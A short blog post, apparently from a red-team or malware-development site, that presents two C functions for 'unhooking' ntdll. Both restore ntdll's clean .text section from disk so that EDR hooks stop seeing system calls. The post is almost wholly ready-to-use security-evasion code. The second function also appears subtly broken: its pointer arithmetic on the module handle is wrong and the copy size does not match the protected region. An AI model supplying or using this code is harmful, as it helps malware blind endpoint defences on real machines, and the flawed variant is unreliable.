---
title: Unhooking
published: 2026-04-20
tags: [Markdown, AntiVirus-Evasion, Anti-Analysis, Malware]
category: AntiVirus-Evasion
draft: false
---

Some EDR vendors inject their hook inside processes's modules, like injecting the hook to the syscall inside ntdll to analyze the parameter and registers.

To bypass this, we can try to list all modules that are loaded inside the process; they proceed to restore the module's original code.

```c title="Unhook.c"

// Original source: redteamleaders.com
#include <windows.h>
#include <winnt.h>
#include <iostream>

bool UnhookNtdll() {
    const wchar_t* ntdllPath = L"C:\\Windows\\System32\\ntdll.dll";

    // 1. Open clean ntdll.dll from disk
    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    // 2. Map clean copy into memory
    LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // 3. Locate `.text` section in mapped and loaded copies
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    LPVOID ntdllBase = GetModuleHandleW(L"ntdll.dll");

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        if (memcmp(section->Name, ".text", 5) == 0) {
            DWORD oldProtect;
            LPVOID pDest = (LPBYTE)ntdllBase + section->VirtualAddress;
            LPVOID pSrc = (LPBYTE)cleanNtdll + section->VirtualAddress;

            // 4. Change memory protection
            if (VirtualProtect(pDest, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                // 5. Overwrite with clean section
                memcpy(pDest, pSrc, section->Misc.VirtualSize);

                // 6. Restore original protection
                VirtualProtect(pDest, section->Misc.VirtualSize, oldProtect, &oldProtect);
            }
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return true;
}


void UnhookNtdll_2() {
    // Open clean ntdll from disk
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD size = GetFileSize(hFile, NULL);
    BYTE* cleanNtdll = new BYTE[size];
    ReadFile(hFile, cleanNtdll, size, &size, NULL);

    // Locate .text section in the clean file
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(cleanNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            // Overwrite hooked ntdll .text in memory
            DWORD oldProtect;
            VirtualProtect((LPVOID)(GetModuleHandleW(L"ntdll.dll") + section[i].VirtualAddress),
                section[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            memcpy((LPVOID)(GetModuleHandleW(L"ntdll.dll") + section[i].VirtualAddress),
                cleanNtdll + section[i].PointerToRawData, section[i].SizeOfRawData);

            VirtualProtect((LPVOID)(GetModuleHandleW(L"ntdll.dll") + section[i].VirtualAddress),
                section[i].Misc.VirtualSize, oldProtect, &oldProtect);

            break;
        }
    }

    delete[] cleanNtdll;
    CloseHandle(hFile);
}

```